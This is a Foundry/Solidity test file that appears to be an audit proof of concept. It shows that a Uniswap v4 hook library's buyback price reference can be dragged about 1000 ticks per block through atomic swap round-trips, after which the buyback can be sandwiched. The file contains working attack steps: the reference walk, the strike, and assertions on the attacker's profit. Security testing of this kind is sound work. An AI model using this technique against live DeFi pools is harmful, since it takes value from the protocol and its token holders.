// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test} from "forge-std/Test.sol";
import {PoolManager} from "v4-core/src/PoolManager.sol";
import {IPoolManager} from "v4-core/src/interfaces/IPoolManager.sol";
import {IHooks} from "v4-core/src/interfaces/IHooks.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {PoolId, PoolIdLibrary} from "v4-core/src/types/PoolId.sol";
import {Currency} from "v4-core/src/types/Currency.sol";
import {SwapParams} from "v4-core/src/types/PoolOperation.sol";
import {ModifyLiquidityParams} from "v4-core/src/types/PoolOperation.sol";
import {BalanceDelta} from "v4-core/src/types/BalanceDelta.sol";
import {StateLibrary} from "v4-core/src/libraries/StateLibrary.sol";
import {TickMath} from "v4-core/src/libraries/TickMath.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {CauldronToken} from "../../CauldronToken.sol";
import {LegacyBuyLib} from "../../cauldron/LegacyBuyLib.sol";

/**
 * @notice S0a — the price reference LegacyBuyLib bounds its buyback against can be
 *         walked an arbitrary distance for a per-block fee, because `_syncRef`
 *         measures the deviation against the tick produced INSIDE the attacker's own
 *         transaction.
 *
 *  LegacyBuyLib.sol:266-269 claims: "AT MOST `MAX_TICK_DEV` TICKS PER BLOCK. An
 *  honest market drags it along within a block or two; an attacker who wants it D
 *  ticks away must hold a manipulated price for D/1000 whole blocks, exposed to every
 *  arbitrageur for each of them."
 *
 *  The attacker does not have to HOLD anything. `_syncRef` runs once per block, at
 *  whatever tick is live when `buyStep` is reached, and `buyStep` is reached from
 *  `afterSwap` of the attacker's own swap. So one atomic push-and-unwind per block
 *  drags the reference 1000 ticks with zero inter-block exposure. Once the reference
 *  sits far BELOW honest spot, `max(sp, refSqrt) == sp` and the bound degenerates to
 *  exactly the self-impact bound the fix was written to replace.
 */
contract S0aLegacyRefWalk is Test {
    using PoolIdLibrary for PoolKey;
    using StateLibrary for IPoolManager;

    IPoolManager pm;
    CauldronToken token;
    RefHarness hookLike;
    PoolKey key;
    PoolId pid;

    int24 constant SPACING = 200;
    uint24 constant FEE = 10_000; // 1%, the production pool fee
    uint160 constant MIN_LIMIT = TickMath.MIN_SQRT_PRICE + 1;
    uint160 constant MAX_LIMIT = TickMath.MAX_SQRT_PRICE - 1;

    uint256 constant POOL_ETH = 10 ether;
    uint256 constant POOL_TOK = 100_000_000 ether;
    uint256 constant BUFFER = 1 ether;

    /// @dev LegacyBuyLib.REF_SLOT (internal constant, recomputed here).
    bytes32 constant REF_SLOT = keccak256("cauldron.legacybuy.priceref.v1");

    function setUp() public {
        pm = IPoolManager(address(new PoolManager(address(this))));
        token = new CauldronToken("Legacy", "LEG", 1, address(this), 500_000_000 ether);
        key = PoolKey({
            currency0: Currency.wrap(address(0)),
            currency1: Currency.wrap(address(token)),
            fee: FEE,
            tickSpacing: SPACING,
            hooks: IHooks(address(0))
        });
        pid = key.toId();
        pm.initialize(key, _sqrtPriceFor(POOL_TOK, POOL_ETH));
        vm.deal(address(this), 1_000_000 ether);
        _addLiquidity();
        hookLike = new RefHarness(pm, key);
        vm.roll(block.number + 10);
    }

    // ── pool primitives ─────────────────────────────────────────────────────
    uint8 private _mode;
    uint128 private _liq;

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == address(pm), "pm");
        if (_mode == 1) {
            pm.modifyLiquidity(
                key,
                ModifyLiquidityParams({
                    tickLower: -887_200,
                    tickUpper: 887_200,
                    liquidityDelta: int256(uint256(_liq)),
                    salt: bytes32(0)
                }),
                ""
            );
            _settleAll();
            return "";
        }
        (bool z, int256 amt, uint160 lim) = abi.decode(data, (bool, int256, uint160));
        BalanceDelta d = pm.swap(key, SwapParams({zeroForOne: z, amountSpecified: amt, sqrtPriceLimitX96: lim}), "");
        _settleAll();
        return abi.encode(d);
    }

    function _settleAll() private {
        int256 d0 = pm.currencyDelta(address(this), key.currency0);
        int256 d1 = pm.currencyDelta(address(this), key.currency1);
        if (d0 < 0) pm.settle{value: uint256(-d0)}();
        if (d1 < 0) {
            pm.sync(key.currency1);
            IERC20(address(token)).transfer(address(pm), uint256(-d1));
            pm.settle();
        }
        if (d0 > 0) pm.take(key.currency0, address(this), uint256(d0));
        if (d1 > 0) pm.take(key.currency1, address(this), uint256(d1));
    }

    function _addLiquidity() internal {
        _liq = uint128(_sqrt(POOL_ETH * POOL_TOK));
        _mode = 1;
        pm.unlock("");
        _mode = 0;
    }

    function _swap(bool z, int256 amt) internal returns (BalanceDelta) {
        return _swapTo(z, amt, z ? MIN_LIMIT : MAX_LIMIT);
    }

    function _swapTo(bool z, int256 amt, uint160 lim) internal returns (BalanceDelta) {
        _mode = 0;
        return abi.decode(pm.unlock(abi.encode(z, amt, lim)), (BalanceDelta));
    }

    receive() external payable {}

    function _sqrtPriceFor(uint256 a1, uint256 a0) internal pure returns (uint160) {
        uint256 ratio = (a1 * 1e18) / a0;
        return uint160(_sqrt(ratio) * 2 ** 96 / 1e9);
    }

    function _sqrt(uint256 x) internal pure returns (uint256 y) {
        if (x == 0) return 0;
        uint256 z = (x + 1) / 2;
        y = x;
        while (z < y) { y = z; z = (x / z + z) / 2; }
    }

    function _tick() internal view returns (int24 t) { (, t,,) = pm.getSlot0(pid); }

    /// @dev The library's per-pool reference, read straight out of the delegating
    ///      contract's namespaced slot.
    function _ref() internal view returns (int24) {
        uint256 packed = uint256(vm.load(address(hookLike), keccak256(abi.encode(pid, REF_SLOT))));
        return int24(uint24(packed & 0xFFFFFF));
    }

    // ── the mechanism ───────────────────────────────────────────────────────

    function _warmUp() internal {
        vm.deal(address(hookLike), BUFFER);
        hookLike.run(BUFFER); // seeds the reference, spends nothing
        vm.roll(vm.getBlockNumber() + 1);
        vm.deal(address(hookLike), BUFFER);
        hookLike.run(BUFFER); // one honest buyback
        vm.roll(vm.getBlockNumber() + 1);
        uint256 held = token.balanceOf(address(hookLike));
        if (held > 0) {
            vm.prank(address(hookLike));
            token.transfer(address(this), held);
        }
    }

    /// @dev One block of the walk: push the tick far below the reference, let the
    ///      buyback see it (it refuses, so nothing is spent), unwind atomically.
    ///      Returns whether the buyback refused and the ETH the round trip cost.
    function _walkOneBlock(uint256 pushEth) internal returns (bool refused, uint256 cost) {
        vm.deal(address(hookLike), BUFFER);
        uint256 e0 = address(this).balance;
        uint256 t0 = token.balanceOf(address(this));
        _swap(true, -int256(pushEth));
        uint256 bought = token.balanceOf(address(this)) - t0;
        (uint256 spent,) = hookLike.run(BUFFER);
        refused = (spent == 0);
        _swap(false, -int256(bought));
        cost = e0 > address(this).balance ? e0 - address(this).balance : 0;
    }

    /// @dev The strike: with the reference parked far below spot, push the tick down
    ///      to just above the reference and let the buyback fill there.
    function _strike() internal returns (uint256 got, int256 pnl) {
        vm.deal(address(hookLike), BUFFER);
        uint256 e0 = address(this).balance;
        uint256 t0 = token.balanceOf(address(this));
        // Stop the push just above the reference so `max(sp, refSqrt) == sp` and the
        // bound is the pure self-impact one.
        uint160 target = TickMath.getSqrtPriceAtTick(_ref() + 600);
        _swapTo(true, -int256(500_000 ether), target);
        uint256 bought = token.balanceOf(address(this)) - t0;
        (, got) = hookLike.run(BUFFER);
        _swap(false, -int256(bought));
        pnl = int256(address(this).balance) - int256(e0)
            + int256(token.balanceOf(address(this))) - int256(t0);
    }

    function _honest() internal returns (uint256 got) {
        vm.deal(address(hookLike), BUFFER);
        (, got) = hookLike.run(BUFFER);
    }

    function test_ReferenceWalkRestoresTheSandwich() public {
        _warmUp();
        int24 honestTick = _tick();
        int24 ref0 = _ref();
        uint256 snap = vm.snapshotState();

        uint256 honest = _honest();
        emit log_named_uint("tokens bought, honest buyback", honest);
        vm.revertToState(snap);

        // ── the walk: one atomic push-and-unwind per block ───────────────────
        uint256 refusals;
        uint256 walkCost;
        for (uint256 i; i < 25; i++) {
            vm.roll(vm.getBlockNumber() + 1);
            (bool refused, uint256 c) = _walkOneBlock(3 ether);
            if (refused) refusals++;
            walkCost += c;
        }
        int24 refAfter = _ref();
        emit log_named_int("reference tick, before walk  ", ref0);
        emit log_named_int("reference tick, after 25 blk ", refAfter);
        emit log_named_int("honest spot tick             ", honestTick);
        emit log_named_uint("blocks the buyback refused   ", refusals);
        emit log_named_uint("walk cost (wei)              ", walkCost);

        // ── the strike ───────────────────────────────────────────────────────
        vm.roll(vm.getBlockNumber() + 1);
        (uint256 attacked, int256 strikePnl) = _strike();
        emit log_named_uint("tokens bought, sandwiched    ", attacked);
        emit log_named_int("attacker net on strike (wei) ", strikePnl);

        // 1. The reference is NOT bounded to 1000 ticks of honest spot: it has been
        //    dragged 25 * MAX_TICK_DEV away without the attacker ever holding a
        //    position across a block boundary.
        assertLt(refAfter, honestTick - 10_000, "reference walked >10k ticks below honest spot");
        // 2. And with it parked there, the buyback fills at the attacker's tick.
        assertGt(attacked, 0, "the buyback was NOT refused at the manipulated tick");
        assertLt(attacked, honest / 4, "the floor received <25% of the tokens an honest buy delivers");
    }
}

/// @dev Stands in for {CauldronHook}: the contract that DELEGATECALLS LegacyBuyLib.
contract RefHarness {
    IPoolManager public immutable pm;
    PoolKey internal key;

    constructor(IPoolManager _pm, PoolKey memory _key) { pm = _pm; key = _key; }

    function run(uint256 amt) external returns (uint256 spent, uint256 got) {
        (bool ok, bytes memory ret) = address(pm).call(abi.encodeWithSelector(IPoolManager.unlock.selector, abi.encode(amt)));
        if (!ok) return (0, 0); // the hook's self-call is result-ignored; a revert preserves the buffer
        (spent, got) = abi.decode(abi.decode(ret, (bytes)), (uint256, uint256));
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == address(pm), "pm");
        uint256 amt = abi.decode(data, (uint256));
        (uint256 s, uint256 g) = this.buy(key, amt);
        return abi.encode(s, g);
    }

    function buy(PoolKey calldata k, uint256 amt) external returns (uint256, uint256) {
        require(msg.sender == address(this), "self");
        return LegacyBuyLib.buyStep(pm, k, amt, 0);
    }

    receive() external payable {}
}
